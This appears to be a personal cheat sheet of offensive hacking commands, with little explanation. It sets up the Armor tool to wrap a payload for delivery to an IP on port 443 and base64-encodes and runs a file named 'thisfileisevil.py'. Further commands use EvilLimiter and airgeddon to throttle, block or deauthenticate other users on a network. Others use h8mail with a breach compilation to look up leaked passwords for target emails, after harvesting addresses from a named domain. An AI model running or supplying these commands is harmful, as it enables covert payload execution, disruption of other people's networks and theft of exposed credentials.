git clone https://github.com/tokyoneon/Armor
cd Armor/
chmod +x armor.sh
echo 'ls -la' >/tmp/payload.txt
./armor.sh /tmp/payload.txt 1.2.3.4 443



cat thisfileisevil.py | base64
python -c "$(printf '%s' 'ENCODED-PAYLOAD-HERE' | base64 -D)"

############


## EVIL LIMITER--> TO DE AUTH AND KICK OFF NETWORK USERS ###
git clone https://github.com/bitbrute/evillimiter.git
cd evillimiter
sudo python3 setup.py install
sudo evillimiter
limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS 
block 3
hosts
free all




################################################
#### TO LOOK UP BREACHED PASSWORDS AND USER INFO ##### 
git clone https://github.com/khast3x/h8mail.git
apt-get install nodejs
cd h8mail
pip3 install -r requirements.txt
python3 ./h8mail.py -h
python3 h8mail.py -h
python3 h8mail.py -t email@tosearch.com -bc 'location_of_your_file/BreachCompilation' --local


### TO RETURN DOMAIN EMAILS ####
theharvester -d dedicatedglass.com -l 1000 -b pgp
nano targets.txt
python3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local


################################################

### AIRGEDDON --> DEAUTH USERS WHEN NOT ON ROUTER 
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh




